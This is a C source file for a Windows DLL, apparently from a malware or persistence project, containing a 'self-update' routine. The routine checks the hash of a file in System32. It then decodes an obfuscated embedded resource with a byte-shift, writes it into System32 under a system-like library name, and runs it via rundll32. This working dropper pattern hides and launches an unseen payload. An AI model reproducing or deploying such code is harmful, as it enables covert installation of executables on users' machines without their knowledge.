#include "execute.h"
#include <khopanstring.h>
#include "resource.h"

static HINSTANCE globalInstance;

BOOL CheckAndProcessSelfUpdate(cJSON* root) {
	if(!cJSON_HasObjectItem(root, "self")) {
		return TRUE;
	}

	cJSON* selfObject = cJSON_GetObjectItem(root, "self");

	if(!cJSON_HasObjectItem(selfObject, "url")) {
		return TRUE;
	}

	LPWSTR pathFolderWindows = KHWin32GetWindowsDirectoryW();

	if(!pathFolderWindows) {
		return TRUE;
	}

	LPWSTR pathFolderSystem32 = KHFormatMessageW(L"%ws\\" FOLDER_SYSTEM32, pathFolderWindows);
	LocalFree(pathFolderWindows);

	if(!pathFolderSystem32) {
		return TRUE;
	}

	LPWSTR pathFileLibdll32 = KHFormatMessageW(L"%ws\\" FILE_LIBDLL32, pathFolderSystem32);

	if(!pathFileLibdll32) {
		LocalFree(pathFolderSystem32);
		return TRUE;
	}

	BOOL result = CheckFileHash(selfObject, pathFileLibdll32);
	LocalFree(pathFileLibdll32);

	if(result) {
		MessageBoxW(NULL, L"Hash match", L"libdll32", MB_OK | MB_ICONINFORMATION | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
		LocalFree(pathFolderSystem32);
		return TRUE;
	}

	HRSRC resourceHandle = FindResourceW(globalInstance, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);

	if(!resourceHandle) {
		LocalFree(pathFolderSystem32);
		return TRUE;
	}

	DWORD resourceSize = SizeofResource(globalInstance, resourceHandle);

	if(!resourceSize) {
		LocalFree(pathFolderSystem32);
		return TRUE;
	}

	HGLOBAL resource = LoadResource(globalInstance, resourceHandle);

	if(!resource) {
		LocalFree(pathFolderSystem32);
		return TRUE;
	}

	BYTE* data = LockResource(resource);

	if(!data) {
		LocalFree(pathFolderSystem32);
		return TRUE;
	}

	BYTE* buffer = LocalAlloc(LMEM_FIXED, resourceSize);

	if(!buffer) {
		LocalFree(pathFolderSystem32);
		return TRUE;
	}

	for(DWORD i = 0; i < resourceSize; i++) {
		buffer[i] = (data[i] - 18) % 0xFF;
	}

	LPWSTR pathFileLibupdate32 = KHFormatMessageW(L"%ws\\" FILE_LIBUPDATE32, pathFolderSystem32);

	if(!pathFileLibupdate32) {
		LocalFree(buffer);
		LocalFree(pathFolderSystem32);
		return TRUE;
	}

	HANDLE file = CreateFileW(pathFileLibupdate32, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	LocalFree(pathFileLibupdate32);

	if(file == INVALID_HANDLE_VALUE) {
		LocalFree(buffer);
		LocalFree(pathFolderSystem32);
		return TRUE;
	}

	DWORD bytesWritten;
	result = WriteFile(file, buffer, resourceSize, &bytesWritten, NULL);
	LocalFree(buffer);

	if(!result) {
		LocalFree(pathFolderSystem32);
		return TRUE;
	}

	if(!CloseHandle(file)) {
		LocalFree(pathFolderSystem32);
		return TRUE;
	}

	LPWSTR pathFileRundll32 = KHFormatMessageW(L"%ws\\" FILE_RUNDLL32, pathFolderSystem32);
	LocalFree(pathFolderSystem32);

	if(!pathFileRundll32) {
		return TRUE;
	}

	LPWSTR argumentFileLibupdate32 = KHFormatMessageW(FILE_RUNDLL32 L" " FILE_LIBUPDATE32 L"," FUNCTION_LIBUPDATE32 L" %lu", GetCurrentProcessId());

	if(!argumentFileLibupdate32) {
		LocalFree(pathFileRundll32);
		return TRUE;
	}

	STARTUPINFO startupInformation = {0};
	startupInformation.cb = sizeof(startupInformation);
	PROCESS_INFORMATION processInformation;
	result = CreateProcessW(pathFileRundll32, argumentFileLibupdate32, NULL, NULL, TRUE, 0, NULL, NULL, &startupInformation, &processInformation);
	LocalFree(argumentFileLibupdate32);
	LocalFree(pathFileRundll32);

	if(!result) {
		return TRUE;
	}

	if(!CloseHandle(processInformation.hProcess)) {
		return TRUE;
	}

	CloseHandle(processInformation.hThread);
	MessageBoxW(NULL, L"Hash not match", L"libdll32", MB_OK | MB_ICONERROR | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
	return FALSE;
}

BOOL WINAPI DllMain(HINSTANCE instance, DWORD reason, LPVOID reserved) {
	globalInstance = instance;
	return TRUE;
}
